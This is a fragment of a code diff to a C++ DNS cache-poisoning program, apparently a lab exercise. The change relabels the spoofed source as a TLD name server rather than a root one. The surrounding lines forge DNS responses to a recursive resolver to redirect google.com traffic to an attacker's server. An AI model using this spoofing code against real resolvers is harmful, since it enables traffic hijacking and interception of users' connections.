@@ -16,7 +16,7 @@ int main() {
     // Configuration variables
     string target_domain = "google.com";    // Target domain to spoof
     string request_hostname = "www.google.com";    // Target domain to spoof
-    string root_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be root DNS)
+    string tld_ns_ip = "10.0.0.50";    // Spoofed source (pretending to be tld DNS)
     string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
     string attacker_ip = "10.0.0.10";    // Attacker's IP address
     string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
@@ -69,7 +69,7 @@ int main() {
         UDP udp(recursive_ns_port, 53);    // Create UDP layer (source port: 53, destination port 12345)
         udp /= dns;    // Attach DNS payload
 
-        IP ip = IP(recursive_ns_ip, root_ns_ip) / udp;  // Create IP layer targeting recursive DNS server
+        IP ip = IP(recursive_ns_ip, tld_ns_ip) / udp;  // Create IP layer targeting recursive DNS server
 
         sender.send(ip); // Send the spoofed response
         if (id % 1000 == 0) {
